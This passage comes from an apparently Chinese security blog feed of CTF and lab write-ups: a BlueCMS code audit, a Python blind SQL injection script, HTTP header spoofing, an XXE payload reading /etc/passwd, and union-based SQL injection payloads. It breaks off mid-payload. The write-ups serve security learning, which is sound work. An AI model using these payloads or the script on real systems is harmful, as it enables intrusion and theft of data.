title="问题总结"></a>问题总结</h2><blockquote><p>靶场是自己搭建的，所以在使用中存在一些问题</p></blockquote><ul><li>漏洞太单一了使用 CVE-2020-1472 就打遍了</li><li>对于对于哈希传递（PTH）攻击没有成功，应该是操作问题，需要单独复现一下</li><li>对于域森林的理解还不是太深刻（感觉就是多级代理攻击）</li><li>靶场和实际相差很多，现在使用的比较粗暴的攻击方法没有做到不留痕迹</li><li>后期的后门，痕迹清理还没有使用</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BlueCMS</title>
    <link href="/2021/09/01/BlueCMS/"/>
    <url>/2021/09/01/BlueCMS/</url>
    
    <content type="html"><![CDATA[<h1 id="BlueCMS"><a href="#BlueCMS" class="headerlink" title="BlueCMS"></a>BlueCMS</h1><blockquote><p>BlueCMS__v1.6_sp1</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个CMS是一个很老的版本，这里利用它来学习熟悉一下代码审计。审计的过程中暂时没有利用Seay工具去分析代码，而是尝试直接分析原框架，毕竟这个CMS的源码比较简单。</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="初步了解"><a href="#初步了解" class="headerlink" title="初步了解"></a>初步了解</h3><p>首先从根目录下的<code>index.php</code>文件入手，它是整个程序的入口，一开始它加载了两个php文件，之后再分析这两个文件作用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830092735808.png" alt="image-20210830092735808"></p><p>然后就是页面的各个板块信息的查询与展示，比如新闻分类列表的展示，最新分类信息等，最后利用<code>smarty</code>模板渲染展示页面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830092957266.png" alt="image-20210830092957266"></p><p><code>include/common.inc.php</code>，开始也是包含了一堆PHP文件，然后对单引号过滤，但是这个CMS使用的是GKB编码，可能会存在宽字节绕过并且这里并没有对<code>$_SERVER</code>进行过滤它也是外部可控的数据</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830093831941.png" alt="image-20210830093831941"></p><p>后面就是连接数据库操作，然后就是一些其他工作了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830094358872.png" alt="image-20210830094358872"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830094832335.png" alt="image-20210830094832335"></p><p><code>include/common.fun.php</code> 这个文件定义了很多函数提供调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830095002133.png" alt="image-20210830095002133"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830095038504.png" alt="image-20210830095038504"></p><p>还有一堆函数就不一一列出来了</p><p>后台功能查看</p><p><code>admin/index.php</code> 这个文件没有什么太多的东西，主要就是提醒用户删除安装文件，日志读取，获取配置信息等</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830101752484.png" alt="image-20210830101752484"></p><p>主要的功能逻辑部分是在<code>admin/include/common.inc.php</code>文件中处理的，它有敏感字符过滤，登录验证等功能</p><p>这里用来判断用户是否登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830102017217.png" alt="image-20210830102017217"></p><p><code>admin/login.php</code>用户登录界面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830102950559.png" alt="image-20210830102950559"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830102935926.png" alt="image-20210830102935926"></p><blockquote><p>感觉只要绕过了单引号，这个CMS就到处是SQL漏洞了</p></blockquote><p>其他的文件就是一些杂七杂八的漏洞了，可以先暂时放着</p><h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><p><code>ad_js.php</code> 这个文件中对于sql语句的过滤没有效果，因为是数字型注入</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830091607034.png" alt="image-20210830091607034"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830104231347.png" alt="image-20210830104231347"></p><p><img src="D:\markdown\image-20210830104259328.png" alt="image-20210830104259328"></p><h3 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h3><p>留言板和评论处都存在这个注入漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830110029339.png" alt="image-20210830110029339"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830110111423.png" alt="image-20210830110111423"></p><p>漏洞验证</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830112351558.png" alt="image-20210830112351558"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830112401719.png" alt="image-20210830112401719"></p><h3 id="SQL注入3"><a href="#SQL注入3" class="headerlink" title="SQL注入3"></a>SQL注入3</h3><blockquote><p>宽字节注入</p></blockquote><p>正常输入错误的密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830113226858.png" alt="image-20210830113226858"></p><p>成功利用宽字节注入漏洞进入系统</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830113438244.png" alt="image-20210830113438244"></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><blockquote><p>这个是在后台的漏洞，后台由于默认是管理员操作的所以权限都比较大，敏感操作很多，存在的漏洞就会很多</p></blockquote><p>后台模板管理这里可以读取和修改文件，所以我们可以尝试修改其他文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830123320939.png" alt="image-20210830123320939"></p><p>具体完成操作的PHP文件<code>admin/tpl_manage.php</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830130636799.png" alt="image-20210830130636799"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830130657999.png" alt="image-20210830130657999"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830125516798.png" alt="image-20210830125516798"></p><blockquote><p>使用目录穿越可以读取任意文件内容并且修改</p></blockquote><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p><del>找到操作日志管理，这里有个删除操作，我们尝试分析代码看看是否可以造成任意文件删除</del></p><p>在<code>user.php</code>中发现了一个文件删除的操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830140714576.png" alt="image-20210830140714576"></p><p>这个很任意实现，直接按照逻辑去掉一些参数，之后就可以执行删除操作了</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>在用户修改头像功能处上传任意携带后门的jpg文件，获取到路径<code>data/upload/face_pic/16303030511.jpg</code>然后利用文件包含漏洞执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830140130531.png" alt="image-20210830140130531"></p><blockquote><p>%00截断：条件：magic_quotes_gpc = Off，PHP版本&lt;5.3.4</p><p>路径长度阶段：条件：windows 下目录路径最大长度为256字节，超出部分将丢弃；linux 下目录最大长度为4096字节，超出长度将丢弃；PHP版本&lt;5.2.8</p></blockquote><p>这里由于PHP版本不合适就先没有继续测试了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个CMS是一个非常简单的适合入门审计的，这里面的漏洞不难，主要是需要掌握审计代码的思路与方法。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二分法盲注</title>
    <link href="/2021/01/18/%E4%BA%8C%E5%88%86%E6%B3%95%E7%9B%B2%E6%B3%A8/"/>
    <url>/2021/01/18/%E4%BA%8C%E5%88%86%E6%B3%95%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p>查看第五个数字的时候，发现提示</p><p><img src="https://i.loli.net/2021/01/11/3dq6OA5SfCjtpN9.png" alt="image-20210111205316927"></p><p>访问一下第六个数字</p><p><img src="https://i.loli.net/2021/01/11/HRlzg9heOyEaQtq.png" alt="image-20210111205350930"></p><blockquote><p>看了一下wp，这里提示需要使用异或盲注</p></blockquote><p>使用盲注查看数据库的长度</p><p><img src="https://i.loli.net/2021/01/11/qIypWltXKP7g1iJ.png" alt="image-20210111205926348"></p><blockquote><p>:open_mouth: 是不是哪里弄错了</p><p>检查之后发现我把异或的基本判断定理都弄错了 我是憨憨</p><p>修改payload，写脚本盲注</p></blockquote><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs haskell">// 脚本<br>// 二分法<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-title">url</span> = <span class="hljs-string">&quot;http://8b15efee-ef59-4f8e-83dd-660824e442eb.node3.buuoj.cn/search.php&quot;</span><br><span class="hljs-title">flag</span> = &#x27;&#x27;<br><br><span class="hljs-title">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>    hight = <span class="hljs-number">127</span><br>    low = <span class="hljs-number">31</span><br>    while hight&gt;=low:<br>        mid = (hight+low)// <span class="hljs-number">2</span><br>        # <span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-title">id&#x27;</span>:&#x27;0^(<span class="hljs-title">ascii</span>(<span class="hljs-title">substr</span>(<span class="hljs-title">database</span>(),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(<span class="hljs-title">i</span>,<span class="hljs-title">mid</span>)&#125;  # 查表名  geek</span><br>        # <span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-title">id&#x27;</span>:&quot;0^(<span class="hljs-title">ascii</span>(<span class="hljs-title">substr</span>((<span class="hljs-title">select</span>(<span class="hljs-title">group_concat</span>(<span class="hljs-title">table_name</span>))<span class="hljs-title">from</span>(<span class="hljs-title">information_schema</span>.<span class="hljs-title">tables</span>)<span class="hljs-title">where</span>(<span class="hljs-title">table_schema</span>)=&#x27;<span class="hljs-title">geek&#x27;</span>),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(<span class="hljs-title">i</span>,<span class="hljs-title">mid</span>)&#125; # 查库名 <span class="hljs-type">F1naI1y</span></span><br>        #<span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-title">id&#x27;</span>:&quot;0^(<span class="hljs-title">ascii</span>(<span class="hljs-title">substr</span>((<span class="hljs-title">select</span>(<span class="hljs-title">group_concat</span>(<span class="hljs-title">column_name</span>))<span class="hljs-title">from</span>(<span class="hljs-title">information_schema</span>.<span class="hljs-title">columns</span>)<span class="hljs-title">where</span>(<span class="hljs-title">table_name</span>)=&#x27;<span class="hljs-type">F1naI1y</span>&#x27;),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(<span class="hljs-title">i</span>,<span class="hljs-title">mid</span>)&#125; #查字段 id userh</span><br>         <span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-title">id&#x27;</span>:&quot;0^(<span class="hljs-title">ascii</span>(<span class="hljs-title">substr</span>((<span class="hljs-title">select</span>(<span class="hljs-title">group_concat</span>(<span class="hljs-title">password</span>))<span class="hljs-title">from</span>(<span class="hljs-title">geek</span>.<span class="hljs-type">F1naI1y</span>)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(<span class="hljs-title">i</span>,<span class="hljs-title">mid</span>)&#125; # 查字段值</span><br>        response = requests.get(url,params=<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br>        s = response.text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;others~~~&quot;</span> <span class="hljs-keyword">in</span> s:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            hight = mid - <span class="hljs-number">1</span><br>    f = int((low+hight+<span class="hljs-number">1</span>))//<span class="hljs-number">2</span><br>     <span class="hljs-keyword">if</span>(f==<span class="hljs-number">127</span> or f==<span class="hljs-number">31</span>):<br>         break<br>    flag = flag + chr(f)<br>    print(flag)<br><br></code></pre></td></tr></table></figure><blockquote><p>可能是由于buu平台的原因，脚本执行过久就会出现错误，但是主要是要学会对sql盲注的脚本编写，并且熟练掌握二分法</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP特殊请求头</title>
    <link href="/2021/01/18/HTTP%E7%89%B9%E6%AE%8A%E8%AF%B7%E6%B1%82%E5%A4%B4/"/>
    <url>/2021/01/18/HTTP%E7%89%B9%E6%AE%8A%E8%AF%B7%E6%B1%82%E5%A4%B4/</url>
    
    <content type="html"><![CDATA[<blockquote><p>最近做了一道CTF的题，里面应用了http的各种头，记录下来学习学习</p></blockquote><h1 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h1><h3 id="打开题目"><a href="#打开题目" class="headerlink" title="打开题目"></a>打开题目</h3><p><img src="https://i.loli.net/2020/12/20/NqxatShcbRrQwyj.png" alt="image-20201220223807400"></p><blockquote><p>尝试弱口令登录与SQL注入</p></blockquote><p>抓包</p><p><img src="https://i.loli.net/2020/12/20/Kwq5lz42gfh9oCA.png" alt="image-20201220224157732"></p><p>修改时间，然后发现新线索</p><p><img src="https://i.loli.net/2020/12/20/OWMv6lu5HycxE7g.png" alt="image-20201220224129130"></p><p>使用**<em>Client-ip: 127.0.0.1**</em> ,又出现新的线索</p><p><img src="https://i.loli.net/2020/12/20/8W1zlVCqOQEtvN6.png" alt="image-20201220224438421"></p><p>使用*** Referer: gem-love.com *** 又有新提示</p><p><img src="https://i.loli.net/2020/12/20/ZbgB52qGpS6n8Xl.png" alt="image-20201220224558708"></p><p>这里有个坑，需要使用Commodo 64的全称，Commodore 64；</p><p><strong>* User-Agent： Commodore 64*</strong> </p><p><img src="https://i.loli.net/2020/12/20/rVhP4yswMF38g1k.png" alt="image-20201220225317596"></p><p>指定邮箱*** From: <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#64;&#103;&#x65;&#x6d;&#x2d;&#108;&#x6f;&#x76;&#101;&#46;&#x63;&#x6f;&#x6d;">&#x72;&#x6f;&#x6f;&#116;&#64;&#103;&#x65;&#x6d;&#x2d;&#108;&#x6f;&#x76;&#101;&#46;&#x63;&#x6f;&#x6d;</a>***</p><p><img src="https://i.loli.net/2020/12/20/eWg5bEnzAyQfTkY.png" alt="image-20201220225553050"></p><p>指定服务器**<em>Via: y1ng.vip**</em></p><p><img src="https://i.loli.net/2020/12/20/AxtY9Kzbp2UhNiZ.png" alt="image-20201220225711978"></p><p>base64解码即可</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个题目本身不难，主要考的就是**<em>请求首部字段**</em>的熟练使用</p><table><thead><tr><th>Header</th><th>作用</th></tr></thead><tbody><tr><td>Accept</td><td>指定客户端能够接收的内容类型</td></tr><tr><td>Via</td><td>通知中间网关或代理服务器地址，通信协议</td></tr><tr><td>Referer</td><td>先前的网址，当前请求的网页紧随其后，即来路</td></tr><tr><td>Range</td><td>只请求实体的一部分，指定范围</td></tr><tr><td>From</td><td>发出请求的用户的Email</td></tr><tr><td>Cookie</td><td>存储cookie信息</td></tr><tr><td>User-Agent</td><td>包含发出请求的用户信息</td></tr><tr><td>TE</td><td>客户端接受的传输编码，通知服务器接受尾加头信息</td></tr><tr><td>Host</td><td>指定请求的服务器的域名和端口号</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE漏洞</title>
    <link href="/2021/01/17/XXE%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/01/17/XXE%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>XXE漏洞</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">XXE(<span class="hljs-type">XML</span> <span class="hljs-keyword">External</span> Injection)全称为<span class="hljs-type">XML</span>外部实体注入<br><br><span class="hljs-type">XML</span>：设计用来传输与显示数据，其焦点是数据的内容<br>HTML：设计用来显示数据，其焦点是数据的外观<br><br><span class="hljs-type">XML</span>文档类型定义，即DTD。XXE漏洞所在的地方<br>XXE漏洞的触发点一般发生在可以上传<span class="hljs-type">XML</span>文件的位置，没有对上传的<span class="hljs-type">XML</span>文件进行过滤，导致恶意的<span class="hljs-type">xml</span>文件被上传。<br></code></pre></td></tr></table></figure><h4 id="XML基本了解"><a href="#XML基本了解" class="headerlink" title="XML基本了解"></a>XML基本了解</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs xml">xml的注意要求：<br>1. 所有xml元素都必须有关闭标签<br>2. xml标签对大小写敏感<br>3. xml必须正确嵌套<br>4. xml文档必须有根元素<br>5. xml的属性值必须加引号<br><br>xml文档的注释：<span class="hljs-comment">&lt;!-- --&gt;</span><br><br>DTD(文档类型定义)：可定义合法的xml文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行的声明于XML文档中，也可以作为一个外部引用<br><br>DTD的三种应用形式：<br>1. 内部DTD文档  <span class="hljs-meta">&lt;!DOCTYPE 根元素[定义内容]&gt;</span><br>2. 外部DTD文档  <span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTD文件路径&quot;</span>&gt;</span><br>3. 内外DTD结合  <span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTD文件路径&quot;</span> [定义内容]&gt;</span><br><br>DTD实体：<br>用于定义引用普通文本或特殊的快捷方式变量；实体引用是对实体的以用；实体可在内部或外部进行声明。<br>实体分为：一般实体和参数实体<br>一般实体的声明方法：<span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-string">&quot;实体内容&quot;</span>&gt;</span>  引用一般实体的方法：&amp;实体名称<br>* 一般实体可以在DTD，xml，声明前，实体声明内部引用<br>参数实体的声明：<span class="hljs-meta">&lt;!ENTITY % 实体名称 <span class="hljs-meta-string">&quot;实体内容&quot;</span>&gt;</span>  引用参数实体的方法：%实体名称<br>* 参数实体只能在DTD中引用<br>内部实体：<span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-string">&quot;实体的值&quot;</span> &gt;</span> <br>例：<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-string">&quot;hello&quot;</span>&gt;</span>]&gt;</span> <br>   <span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;xxe<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br>外部实体：用来引入外部资源，有SYSTEM 和 PUBLIC 两个关键字，表示实体来自本地计算机还是公共计算机<br><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;URL&quot;</span>&gt;</span><br><br>外部实体的引用可以利用如下协议：<br>file:///path/to/file.txt<br>http://url/file.txt<br>php://filter/read=convert.base64-encode/resource=flag.txt<br><br>外部实体可以支持http,file 等协议，所以可以通过引用外部实体进行远程文件读取<br>例：<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xdsec</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">methodname</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span>(实体引用名) <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>(实体内容) &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">methodcall</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">methodname</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">methodname</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">methodcall</span>&gt;</span><br>这里的xml外部实体xxe被赋予的值为file:///etc/passwd 当解析xml文档时，&amp;xxe会被替换为file:///ect/passwd的内容，导致敏感信息泄露<br></code></pre></td></tr></table></figure><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>此题就是一个简单的xxe攻击</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">payload:</span><br><span class="php"><span class="hljs-meta">&lt;?</span> xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ELENENT <span class="hljs-meta-keyword">name</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">person</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="xml">]&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;person;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/01/SMizh13REwGK4NJ.png" alt="image-20210101221407136"></p><blockquote><p>flag的位置是猜出来的</p></blockquote><p><strong>XXE漏洞后期可以专门学习一下</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无列名注入</title>
    <link href="/2021/01/17/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/01/17/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><blockquote><p>2021.1.16</p></blockquote><p>这题确实不会，查看大佬的wp</p><blockquote><p>需要利用MariaDB的一些特性</p></blockquote><h3 id="知识点学习"><a href="#知识点学习" class="headerlink" title="知识点学习"></a>知识点学习</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">MariaDB数据库可以利用 mysql.innodb_table_stats 查表名<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> mysql.innodb_table_stats<br></code></pre></td></tr></table></figure><h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><p><img src="https://i.loli.net/2021/01/16/A84hlyWBDit2JRv.png" alt="image-20210116224446299"></p><blockquote><p>正常查询时列名正常显示</p></blockquote><p><img src="https://i.loli.net/2021/01/16/y132WJfRGQIiXsY.png" alt="image-20210116224526741"></p><blockquote><p>使用联合查询，这时列名发生了变化</p></blockquote><p><strong>这里可以利用这个方式在不知道列名的情况下查询内容</strong></p><p><img src="https://i.loli.net/2021/01/16/YrJjZqGx57L2OwT.png" alt="image-20210116224644826"></p><blockquote><p>使用反引号和别名，直接获取到了单列的值</p></blockquote><p>反引号禁用时</p><p><img src="https://i.loli.net/2021/01/17/WZLItMnwHgpuEea.png" alt="image-20210116224745966"></p><blockquote><p>这里直接利用了取别名的方式，没有使用反引号</p></blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">相关学习文章</a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><blockquote><p>二次注入</p></blockquote><p>直接将广告名写为<code>1’</code>,保存后查看</p><p><img src="https://i.loli.net/2021/01/16/X7spl92mhPaSAVj.png" alt="image-20210116231225422"></p><blockquote><p>这题需要在申请广告的广告名处注入，之前搞错了…… 拿着id怼了半天……</p></blockquote><p><img src="https://i.loli.net/2021/01/16/yTW5QDNOxFw6iA3.png" alt="image-20210116233000715"></p><p><img src="https://i.loli.net/2021/01/16/qCaRDUL7fNQ89PT.png" alt="image-20210116232950459"></p><blockquote><p>这里报错字段长度不对劲</p></blockquote><p><img src="https://i.loli.net/2021/01/16/wNePUZ6cGOmBEAT.png" alt="image-20210116233057745"></p><p><img src="https://i.loli.net/2021/01/16/AS4xrPyTJiYIgh5.png" alt="image-20210116233047870"></p><blockquote><p>多次尝试发现字段长度为22并且回显的地方为2，3两处</p></blockquote><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">查库：<span class="hljs-number">-1</span>&#x27;<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,user(),group_concat(table_name),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>mysql.innodb_table_stats<span class="hljs-comment">/**/</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/16/eaVDdcNtIFxEb4r.png" alt="image-20210116233316001"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">payload:<br>-1&#x27;<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span 